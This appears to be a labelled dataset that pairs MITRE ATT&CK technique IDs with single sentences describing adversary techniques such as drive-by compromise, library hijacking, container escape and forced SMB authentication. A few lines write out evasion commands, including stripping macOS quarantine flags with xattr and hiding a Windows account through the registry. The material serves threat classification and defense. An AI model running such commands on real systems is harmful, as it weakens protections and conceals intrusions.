T1562,"For example, PowerShell versions 5+ includes Script Block Logging  which can record executed script content."
T1562,"However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected."
T1562,"Adversaries may downgrade and use less-secure versions of various features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle."
T1601,Adversaries may install an older version of the operating system of a network device to weaken security.
T1601,"Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features."
T1601,"On embedded devices, downgrading the version typically only requires replacing the operating system file in storage."
T1601,"With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart."
T1601,The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.
T1601,Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption.
T1601,"Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image."
T1189,Adversaries may gain access to a system through a user visiting a website over the normal course of browsing.
T1189,"With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token."
T1189,"Multiple ways of delivering exploit code to a browser exist, including:
* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting."
T1189,* Malicious ads are paid for and served through legitimate ad providers.
T1189,* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client .
T1189,"Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest."
T1189,This kind of targeted attack is referred to a strategic web compromise or watering hole attack.
T1189,There are several known examples of this occurring.
T1189,"Typical drive-by compromise process:
1."
T1189,A user visits a website that is used to host the adversary controlled content.
T1189,2.
T1189,"Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version."
T1189,* The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
T1189,3.
T1189,"Upon finding a vulnerable version, exploit code is delivered to the browser."
T1189,4.
T1189,"If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place."
T1189,* In some cases a second visit to the website after the initial scan is required before exploit code is delivered.
T1189,"Unlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website."
T1189,This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.
T1189,"Adversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information."
T1189,These malicious applications have been delivered through popups on legitimate websites.
T1189,"KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure."
T1189,POORAIM has been delivered through compromised sites acting as watering holes.

T1189,"Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools."
T1608,Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing.
T1608,"Endpoint systems may be compromised through browsing to adversary controlled sites, as in Drive-by Compromise."
T1608,"In such cases, the user's web browser is typically targeted for exploitation , but adversaries may also set up websites for non-exploitation behavior such as Application Access Token."
T1608,"Prior to Drive-by Compromise, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site."
T1608,Drive-by content can be staged on adversary controlled infrastructure that has been acquired  or previously compromised .
T1608,"Adversaries may upload or inject malicious web content, such as JavaScript, into websites."
T1608,"This may be done in a number of ways, including inserting malicious script into web pages or other user controllable web content such as forum posts."
T1608,Adversaries may also craft malicious web advertisements and purchase ad space on a website through legitimate ad providers.
T1608,"In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser  to ensure it is vulnerable prior to attempting exploitation."
T1608,"Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest."
T1608,Adversaries may purchase domains similar to legitimate domains  during acquisition of infrastructure  to help facilitate Drive-by Compromise.
T1608,Threat Group-3390 has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest.
T1608,"APT32 has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update."
T1608,"Transparent Tribe has set up websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools."
T1574,Adversaries may execute their own payloads by placing a malicious dynamic library  with an expected name in a path a victim application searches at runtime.
T1574,The dynamic loader will try to find the dylibs based on the sequential order of the search paths.
T1574,"Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable."
T1574,"Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present."
T1574,Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.
T1574,Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.
T1574,Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources.
T1574,"Based on the application, this could result in privilege escalation and uninhibited network access."
T1574,This method may also evade detection from security products since the execution is masked under a legitimate process.
T1559,Adversaries may use Windows Dynamic Data Exchange  to execute arbitrary commands.
T1559,DDE is a client-server protocol for one-time and/or continuous inter-process communication  between applications.
T1559,"Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links , hot data links , and requests for command execution."
T1559,"Object Linking and Embedding , or the ability to link data between documents, was originally implemented through DDE."
T1559,"Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys."
T1559,"Microsoft Office documents can be poisoned with DDE commands  , directly or through embedded files , and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications  macros."
T1559,DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter.
T1559,DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model .
T1559,GravityRAT has been delivered via Word documents using DDE for execution.
T1559,POWERSTATS can use DDE to execute additional payloads on compromised hosts.

T1574,Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries.
T1574,"During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS."
T1574,"Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name."
T1574,"These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library."
T1574,"On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges."
T1574,"Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function."
T1574,Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python’s os.environ.
T1574,"On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program."

T1548,Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.
T1548,"The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating."
T1548,This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.
T1548,"Although this API is deprecated, it still fully functions in the latest releases of macOS."
T1548,"When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made."
T1548,The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.
T1548,Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.

T1114,Kimsuky has set auto-forward rules on victim's e-mail accounts.
T1114,Silent Librarian has set up auto forwarding rules on compromised e-mail accounts.
T1564,Adversaries may use email rules to hide inbound emails in a compromised user's mailbox.
T1564,"Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails."
T1564,Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule PowerShell cmdlets on Windows systems.
T1564,Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders.
T1564,"Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account."
T1564,Any user or administrator within the organization  may be able to create rules to automatically move or delete emails.
T1564,These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender.
T1564,Malicious rules commonly filter out emails based on key words  found in message bodies and subject lines.
T1564,"FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as “hacked,"" ""phish,"" and “malware"" in a likely attempt to prevent organizations from communicating about their activities."
T1546,Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon .
T1546,"Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action."
T1546,The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.
T1546,"The rule files are in the plist format and define the name, event type, and action to take."
T1546,Some examples of event types include system startup and user authentication.
T1546,Examples of actions are to run a system command or send an email.
T1546,"The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the Launch Daemon configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist."
T1546,"Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication."
T1546,Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.

T1573,Tropic Trooper has encrypted traffic with the C2 to prevent network detection.
T1499,Adversaries may perform Endpoint Denial of Service  attacks to degrade or block the availability of services to users.
T1499,Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition.
T1499,"Example services include websites, email services, DNS, and web-based applications."
T1499,"Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion."
T1499,An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service.
T1499,Adversaries can target various layers of the application stack that is hosted on the system used to provide the service.
T1499,"These layers include the Operating Systems , server applications such as web servers, DNS servers, databases, and the  applications that sit on top of them."
T1499,Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components.
T1499,"A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS ."
T1499,"To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets."
T1499,"Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection."
T1499,This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.
T1499,Botnets are commonly used to conduct DDoS attacks against networks and services.
T1499,Large botnets can generate a significant amount of traffic from systems spread across the global internet.
T1499,"In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources."
T1499,"Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks."
T1499,"In cases where traffic manipulation is used, there may be points in the the global network  where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume."
T1499,This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.
T1499,"For attacks attempting to saturate the providing network, see Network Denial of Service."
T1499,ZxShell has a feature to perform SYN flood attack on a host.
T1499,OnionDuke has the capability to use a Denial of Service module.
T1499,"Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019."
T1480,Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment.
T1480,Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target.
T1480,Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.
T1480,Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload.
T1480,"Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses."
T1480,"By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult."
T1480,"These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures ."
T1480,"Similar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection."
T1480,Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.
T1480,By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection.
T1480,"Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult."
T1480,This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.
T1480,"Like other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within."
T1480,This activity is distinct from typical Virtualization/Sandbox Evasion.
T1480,"While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful."
T1480,"InvisiMole can use Data Protection API to encrypt its components on the victim’s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer."
T1480,Equation has been observed utilizing environmental keying in payload delivery.
T1480,"APT41 has encrypted payloads using the Data Protection API , which relies on keys tied to specific user accounts on specific machines."
T1480,APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.
T1611,Adversaries may break out of a container to gain access to the underlying host.
T1611,This can allow an adversary access to other containerized resources from the host level or to the host itself.
T1611,"In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment."
T1611,There are multiple ways an adversary may escape to a host environment.
T1611,"Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host, or utilizing a privileged container to run commands on the underlying host."
T1611,"Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine."
T1611,"Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host."
T1611,Doki’s container was configured to bind the host root directory.
T1611,Hildegard has used the BOtB tool that can break out of containers.
T1611,Siloscape maps the host’s C drive to the container by creating a global symbolic link to the host through the calling of NtSetInformationSymbolicLink.
T1611,TeamTNT has deployed privileged containers that mount the filesystem of victim machine.
T1585,Adversaries may create and cultivate accounts with services that can be used during targeting.
T1585,Adversaries can create accounts that can be used to build a persona to further operations.
T1585,"Persona development consists of the development of public information, presence, history and appropriate affiliations."
T1585,"This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity."
T1585,These personas may be fictitious or impersonate real people.
T1585,The persona may exist on a single site or across multiple sites .
T1585,Establishing a persona may require development of additional documentation to make them seem real.
T1585,"This could include filling out profile information, developing social networks, or incorporating photos."
T1585,"Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing."
T1585,APT17 has created and cultivated profile pages in Microsoft TechNet.
T1585,"To make profile pages appear more legitimate, APT17 has created biographical sections and posted in forum threads."
T1585,Fox Kitten has created KeyBase accounts to communicate with ransomware victims.
T1546,Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events.
T1546,Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries.
T1546,Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code.
T1546,"After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked."
T1546,"Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges."
T1098,"Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account."
T1098,"The Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox."
T1098,Adversaries may also assign mailbox folder permissions through individual folder permissions or roles.
T1098,"Adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store , Inbox, or other mailbox folders."
T1098,"By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders."
T1098,This may be used in persistent threat incidents as well as BEC  incidents where an adversary can assign more access rights to the accounts they wish to compromise.
T1098,This may further enable use of additional techniques for gaining access to systems.
T1098,"For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules , so the messages evade spam/phishing detection mechanisms."
T1098,"UNC2452 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes."

T1574,Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer.
T1574,These processes may automatically execute specific binaries as part of their functionality or to perform other actions.
T1574,"If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process."
T1574,"If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM."
T1574,"Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers."
T1574,"During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads."
T1574,"When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process."
T1574,This behavior is related to and may take advantage of DLL Search Order Hijacking.
T1574,Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level.
T1574,Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code.
T1574,This behavior is related to Bypass User Account Control.
T1574,Several examples of this weakness in existing common installers have been reported to software vendors.
T1574,If the executing process is set to run at a specific time or during a certain event  then this technique can also be used for persistence.
T1480,Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target.
T1480,Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.
T1480,"Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory  domains, and local/external IP addresses."
T1480,Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.
T1480,This use of guardrails is distinct from typical Virtualization/Sandbox Evasion.
T1480,"While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match."
T1480,Anchor can terminate itself if specific execution flags are not present.

T1480,"Stuxnet checks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met."
T1480,APT33 has used kill dates in their malware to guardrail execution.
T1048,Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel.
T1048,The data may also be sent to an alternate network location from the main command and control server.
T1048,"Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel."
T1048,Different protocol channels could also include Web services such as cloud storage.

T1048,Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel.
T1048,Asymmetric encryption algorithms are those that use different keys on each end of the channel.
T1048,"Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key."
T1048,Each end of the communication channels requires a private key  and the public key of the other entity.
T1048,The public keys of each entity are exchanged before encrypted communications begin.
T1048,Network protocols that use asymmetric encryption  often utilize symmetric encryption once keys are exchanged.
T1048,Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.

T1203,"Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility."
T1203,"Several types exist:
### Browser-based Exploitation
Web browsers are a common target through Drive-by Compromise and Spearphishing Link."
T1203,Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser.
T1203,These often do not require an action by the user for the exploit to be executed.
T1203,"### Office Applications
Common office and productivity applications such as Microsoft Office are also targeted through Phishing."
T1203,Malicious files will be transmitted directly as attachments or through links to download them.
T1203,These require the user to open the document or file for the exploit to run.

T1491,Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.
T1491,"External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government."
T1491,"Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as Drive-by Compromise."
T1491,"Sandworm Team defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019."
T1090,Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.
T1090,"Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap."
T1090,"Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion."
T1090,External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors.
T1090,"Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers."
T1090,Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated.
T1090,Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.

T1055,Adversaries may inject malicious code into process via Extra Window Memory  in order to evade process-based defenses as well as possibly elevate privileges.
T1055,EWM injection is a method of executing arbitrary code in the address space of a separate live process.
T1055,"Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior ."
T1055,Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class.
T1055,This EWM is intended to store data specific to that window and has specific application programming interface  functions to set and get its value.
T1055,"Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure."
T1055,"Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM."
T1055,Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges.
T1055,Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.
T1055,More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention  by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.
T1055,Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.
T1055,Power Loader overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming  chain and create a malicious thread within Explorer.exe.
T1055,Epic has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.

T1495,"TrickBot module ""Trickboot"" can write or erase the UEFI/BIOS firmware of a compromised device."
T1187,Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.
T1187,The Server Message Block  protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing.
T1187,When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.
T1187,This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.
T1187,Web Distributed Authoring and Versioning  is also typically used by Windows systems as a backup protocol when SMB is blocked or fails.
T1187,WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.
T1187,Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication.
T1187,"An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary  Template Injection, or place a specially crafted file on navigation path for privileged accounts  or on a publicly accessible share to be accessed by victim."
T1187,"When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server."
T1187,"With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials."
T1187,There are several different ways this can occur.
T1187,"Some specifics from in-the-wild use include:
* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened  Template Injection."
T1187,"The document can include, for example, a request similar to file://remote address/Normal.dotm to trigger the SMB request."
T1187,* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\remote address\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.
T1187,EnvyScout can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure.
T1187,DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials.

T1606,Adversaries may forge credential materials that can be used to gain access to web applications or Internet services.
T1606,"Web applications and services  often use session cookies, tokens, or other materials to authenticate and authorize user access."
T1606,Adversaries may generate these credential materials in order to gain access to web resources.
T1606,"This differs from Steal Web Session Cookie, Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users."
T1606,"The generation of web credentials often requires secret values, such as passwords, Private Keys, or other cryptographic seed values."
T1606,"Once forged, adversaries may use these web credentials to access resources , which may bypass multi-factor and other authentication protection mechanisms."
T1056,Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt.
T1056,"When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task ."
T1056,"Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite."
T1056,This type of prompt can be used to collect credentials via various languages such as AppleScript and PowerShell.

T1553,Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls in macOS.
T1553,"When documents, applications, or programs are downloaded an extended attribute  called com.apple.quarantine can be set on the file by the application performing the download."
T1553,"This attribute, also known as a quarantine flag, is read by Apple's Gatekeeper defense program when the file is run and provides a prompt to the user to allow or deny execution."
T1553,"Gatekeeper also monitors an application's usage of dynamic libraries  loaded outside the application folder on any quarantined binary, often using the dlopen function."
T1553,"If the quarantine flag is set in macOS 10.15+, Gatekeeper also checks for a notarization ticket and sends a cryptographic hash to Apple's servers to check for validity for all unsigned executables."
T1553,The quarantine flag is an opt-in system and not imposed by macOS.
T1553,"If an application opts-in, a file downloaded from the Internet will be given a quarantine flag before being saved to disk."
T1553,Any application or user with write permissions to the file can change or strip the quarantine flag.
T1553,"With elevated permission , this attribute can be removed from any file."
T1553,The presence of the com.apple.quarantine quarantine flag can be checked with the xattr command xattr -l /path/to/examplefile.
T1553,"Similarly, this attribute can be recursively removed from all files in a folder using xattr, sudo xattr -d com.apple.quarantine /path/to/folder."
T1553,"Apps and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command do not set this flag."
T1553,"Additionally, it is possible to avoid setting this flag using Drive-by Compromise, which may bypass Gatekeeper."
T1553,"CoinTicker downloads the EggShell mach-o binary using curl, which does not set the quarantine flag."
T1553,OSX_OCEANLOTUS.D uses the command xattr -d com.apple.quarantine to remove the quarantine file attribute used by Gatekeeper and Notarization checks.
T1553,"If running with elevated privileges, OSX/Shlayer uses the spctl command to disable Gatekeeper protection for a downloaded file."
T1553,"OSX/Shlayer also leveraged system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions."

T1484,GPOs are containers for group policy settings made up of files stored within a predicable network path \\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\.
T1484,"Like other objects in AD, GPOs have access controls associated with them."
T1484,By default all user accounts in the domain have permission to read GPOs.
T1484,"It is possible to delegate GPO access control permissions, e.g."
T1484,"write access, to specific users or groups in the domain."
T1484,"Malicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more."
T1484,"Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse."
T1484,"For example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying &lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml."
T1484,"In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in &lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs."

 APT33 has used a variety of publicly available tools like Gpppassword to gather credentials."
T1027,Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files.
T1027,HTML documents can store large binary objects known as JavaScript Blobs  that can later be constructed into file-like objects.
T1027,"Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents."
T1027,HTML5 also introduced a download attribute that may be used to initiate file downloads.
T1027,Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes.
T1027,"Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as text/plain and/or text/html."
T1027,"Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim  Deobfuscate/Decode Files or Information, potentially bypassing content filters."

T1564,Normal users may want to hide users when there are many users accounts on a given system or want to keep an account hidden from the other users on the system.
T1564,"In macOS, every user account has a userID associated with it."
T1564,"When creating a user, you can specify the userID for that account."
T1564,There is a property value in /Library/Preferences/com.apple.loginwindow called Hide500Users that prevents users with userIDs 500 and lower from appearing at the login screen.
T1564,"When using the Create Account technique with a userID under 500  and enabling this property , an adversary can conceal user accounts."
T1564,"In Windows, adversaries may hide user accounts via settings in the Registry."
T1564,"For example, an adversary may add a value to the Windows Registry  or other means that will hide the user “test” from the Windows login screen: reg.exe ADD 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccountsUserList' /v test /t REG_DWORD /d 0 /f."

T1564,Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.
